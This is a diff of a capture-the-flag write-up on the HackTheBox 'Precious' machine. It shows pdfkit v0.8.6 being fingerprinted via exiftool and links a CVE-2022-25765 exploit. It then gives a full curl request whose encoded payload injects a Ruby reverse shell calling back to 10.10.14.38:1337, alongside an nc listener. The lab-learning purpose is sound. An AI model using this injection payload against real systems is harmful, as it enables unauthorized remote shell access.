@@ -164,21 +164,55 @@ Upon starting a python web server and attempting to fetch myself, I noticed a % 
 
 <figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-* Since our server is utilizing Ruby-on-Rails, why not attempt Ruby SSTI?
+Since our server is utilizing Ruby-on-Rails, why not attempt Ruby SSTI? However, let's keep looking.
+
+Let's download any generated PDF and read it's metadata contents with `exiftool`:
+
+* By keeping our python web server running above, we can simply use our local web server to perform this task
+
+<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption><p>Trigger the download from the browser</p></figcaption></figure>
+
+```
+exiftool ~/Downloads/u3k8cdohntpcw26oda5vcsnjcq8vo8k6.pdf
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>pdfkit v0.8.6 has been identified; we should look into this</p></figcaption></figure>
+
+### OSINT
+
+{% embed url="https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell" %}
+
+By simply Googling "<mark style="color:yellow;">pdfkit v0.8.6</mark>", I was able to quickly find multiple references to <mark style="color:yellow;">CVE-2022-25765</mark>
+
+<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
-### Ruby-based Server Side Template Injection (SSTI)
+### Ruby-based Server Side Template Injection (SSTI) Stemming from CVE-2022-25765
 
 I was able to test and locate this vulnerability using simple arithmetic logic directly into the user input field on the web app.&#x20;
 
 After I was able to confirm code execution was taking place, the next logical step is to replace the benign payload with a more malicious one and attempt to execute a reverse shell.
+
+Start HTTP server:
+
+```
+python3 -m http.server
+```
 
 Start nc listener:
 
 ```
 nc -lnvp 1337
 ```
+
+Via Curl Method:&#x20;
+
+{% code overflow="wrap" %}
+```
+curl 'http://precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.38%3A1337%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.38%22%2C1337%29%29%27%60'
+```
+{% endcode %}
 
 <mark style="color:yellow;">Ruby SSTI Python-based Reverse Shell Payload</mark>:
 
